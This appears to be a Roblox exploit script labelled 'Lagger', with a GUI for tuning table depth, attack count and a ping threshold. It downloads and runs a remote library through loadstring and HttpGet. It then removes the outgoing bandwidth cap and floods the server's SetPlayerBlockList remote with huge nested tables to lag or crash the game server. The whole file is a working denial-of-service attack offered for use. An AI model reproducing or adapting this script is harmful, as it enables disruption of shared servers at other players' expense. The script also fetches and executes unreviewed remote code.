local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()
local w = library:CreateWindow("endDtheTurtle")
local b = w:CreateFolder("End#5424")

b:Label("Lagger",{
    TextSize = 25;
    TextColor = Color3.fromRGB(255,255,255);
    BgColor = Color3.fromRGB(69,69,69);
}) 

local toggle = false

b:Button("Toggle", function()
    toggle = not toggle
end)

-- Defaults to 90, adjust as necessary
local tableValue = 90;
b:Slider("table value",{
    min = 50;
    max = 200;
    precise = false;
},function(value)
    tableValue = value
end)

-- Defaults to 1, adjust as necessary
local bombValue = 1;
b:Slider("bomb value",{
    min = 1;
    max = 5;
    precise = false;
},function(value)
    bombValue = value
end)

-- Defaults to 200, adjust as necessary
local maxPing = 200;
b:Slider("Maximum Ping",{
    min = 50;
    max = 2000;
    precise = false;
},function(value)
    maxPing = value
end)

b:DestroyGui()

while wait(0.6) do
    if toggle then
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        local function getmaxvalue(val)
            local mainvalueifonetable = 499999
            if type(val) ~= "number" then
                return nil
            end
            local calculateperfectval = (mainvalueifonetable/(val+2))
            return calculateperfectval
        end
        
        local function bomb(tableincrease, tries)
            local maintable = {}
            local spammedtable = {}
            
            table.insert(spammedtable, {})
            z = spammedtable[1]
            
            for i = 1, tableincrease do
                local tableins = {}
                table.insert(z, tableins)
                z = tableins
            end
            
            local calculatemax = getmaxvalue(tableincrease)
            local maximum
            
            if calculatemax then
                maximum = calculatemax
            else
                maximum = 999999
            end
            
            for i = 1, maximum do
                table.insert(maintable, spammedtable)
            end
            
            while true do
                local ping = game.Workspace.DistributedGameTime.Value
                if ping >= maxPing then
                    break
                end
                for i = 1, tries do
                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
                end
            end
        end
        
        bomb(tableValue, bombValue)
    end
end
